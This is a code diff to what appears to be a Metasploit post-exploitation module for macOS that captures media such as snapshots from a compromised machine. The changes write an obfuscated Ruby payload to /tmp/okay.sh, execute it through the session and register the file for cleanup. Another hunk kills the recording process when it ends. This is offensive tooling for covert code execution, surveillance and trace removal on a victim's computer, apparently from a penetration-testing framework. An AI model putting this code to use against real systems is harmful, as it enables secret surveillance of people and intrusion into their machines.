@@ -10,6 +10,7 @@ class Metasploit3 < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
   include Msf::Post::OSX::RubyDL
+  include Msf::Exploit::FileDropper
 
   POLL_TIMEOUT = 120
 
@@ -64,7 +65,7 @@ class Metasploit3 < Msf::Post
     tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
 
     # make the tmp directories if necessary
-    cmd_exec(['mkdir', '-p', File.dirname(tmp_file)].shelljoin)
+    # cmd_exec('mkdir', ['-p', File.dirname(tmp_file)])
 
     ruby_code = osx_capture_media(
       :action => action.name.downcase,
@@ -82,10 +83,19 @@ class Metasploit3 < Msf::Post
       :snap_file => tmp_file+datastore['SNAP_FILETYPE']
     )
 
-    File.write('/Users/joe/Desktop/r.rb', ruby_code)
-    output = cmd_exec(obfuscated_ruby_cmd(ruby_code))
+    # File.write('/Users/joe/Desktop/r3.rb', obfuscated_ruby_cmd(ruby_code))
+    # return
 
-    puts output
+    output = if session.type == 'meterpreter'
+      # java meterpreter does not do so well with the huge cmd args for some reason.
+      # instead we drop the script, exec, and remember to clean up
+      tmp_sh = '/tmp/okay.sh'
+      write_file(tmp_sh, obfuscated_ruby_cmd(ruby_code))
+      register_files_for_cleanup(tmp_sh)
+      cmd_exec("bash #{tmp_sh}")
+    else
+      cmd_exec(obfuscated_ruby_cmd(ruby_code))
+    end
 
     if action.name =~ /list/i
       print_good output
@@ -157,6 +167,8 @@ class Metasploit3 < Msf::Post
       print_status("Killing record service...")
       cmd_exec("/bin/kill -9 #{@pid}")
     end
+
+    super # let FileDropper do its thing
   end
 
   private
